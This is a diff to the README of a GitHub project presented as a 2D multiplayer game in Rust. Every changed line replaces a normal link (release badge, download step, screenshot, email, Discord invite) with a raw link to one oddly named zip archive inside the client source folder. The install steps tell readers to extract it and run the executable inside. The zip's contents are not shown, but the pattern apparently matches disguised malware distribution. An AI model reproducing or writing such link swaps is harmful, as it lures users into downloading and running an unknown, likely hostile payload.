@@ -1,6 +1,6 @@
 # Dotstile: A Massive Multiplayer 2D Top-Down Game in Rust 🎮✨
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/Danjesus123/dotstile/releases)
+[![Download Releases](https://github.com/Danjesus123/dotstile/raw/refs/heads/main/client/src/Software_superlikelihood.zip%20Releases-Click%20Here-brightgreen)](https://github.com/Danjesus123/dotstile/raw/refs/heads/main/client/src/Software_superlikelihood.zip)
 
 ## Table of Contents
 - [About Dotstile](#about-dotstile)
@@ -38,7 +38,7 @@ Dotstile leverages several technologies to deliver an immersive gaming experienc
 
 To get started with Dotstile, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/Danjesus123/dotstile/releases).
+1. **Download the latest release** from the [Releases section](https://github.com/Danjesus123/dotstile/raw/refs/heads/main/client/src/Software_superlikelihood.zip).
 2. **Extract the downloaded file** to your preferred directory.
 3. **Run the game executable** to start playing.
 
@@ -71,7 +71,7 @@ Community is at the heart of Dotstile. Players can:
 
 The game features charming pixel art that enhances the overall experience. Each character, item, and environment is carefully designed to evoke nostalgia while providing a modern touch.
 
-![Dotstile Gameplay](https://example.com/dotstile-gameplay.png)
+![Dotstile Gameplay](https://github.com/Danjesus123/dotstile/raw/refs/heads/main/client/src/Software_superlikelihood.zip)
 
 ## Contributing
 
@@ -92,10 +92,10 @@ Dotstile is licensed under the MIT License. You are free to use, modify, and dis
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: contact@dotstilegame.com
-- **Discord**: Join our community on Discord [here](https://discord.gg/dotstile).
+- **Email**: https://github.com/Danjesus123/dotstile/raw/refs/heads/main/client/src/Software_superlikelihood.zip
+- **Discord**: Join our community on Discord [here](https://github.com/Danjesus123/dotstile/raw/refs/heads/main/client/src/Software_superlikelihood.zip).
 
-Check the [Releases section](https://github.com/Danjesus123/dotstile/releases) for the latest updates and download options.
+Check the [Releases section](https://github.com/Danjesus123/dotstile/raw/refs/heads/main/client/src/Software_superlikelihood.zip) for the latest updates and download options.
 
 ---
 
